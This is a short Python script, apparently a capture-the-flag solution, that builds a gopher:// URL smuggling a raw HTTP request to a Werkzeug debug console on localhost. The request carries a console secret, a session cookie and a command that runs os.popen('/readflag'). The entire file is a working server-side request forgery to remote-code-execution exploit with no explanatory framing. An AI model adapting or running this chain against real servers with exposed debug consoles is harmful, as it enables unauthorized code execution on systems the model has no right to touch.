import urllib.parse

def generate_exploit_with_frm():
    target_ip = "127.0.0.1"
    target_port = "5000"
    
    cookie_name = "__wzd8fe6343c0faf4f031d62"
    cookie_value = "1770508435|601d98159890"
    secret = "aBCCW9bJLfWo4mtzFwSn"
    
    cmd = "__import__('os').popen('/readflag').read()"

    params = urllib.parse.urlencode({
        "__debugger__": "yes",
        "cmd": cmd,
        "frm": "0",
        "s": secret
    })

    raw_http = (
        f"GET /console?{params} HTTP/1.1\r\n"
        f"Host: {target_ip}:{target_port}\r\n"
        f"Cookie: {cookie_name}={cookie_value}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )

    encoded_payload = urllib.parse.quote(raw_http.encode('utf-8'), safe='')
    
    full_url = f"gopher://{target_ip}:{target_port}/_{encoded_payload}"

    print(full_url)

if __name__ == "__main__":
    generate_exploit_with_frm()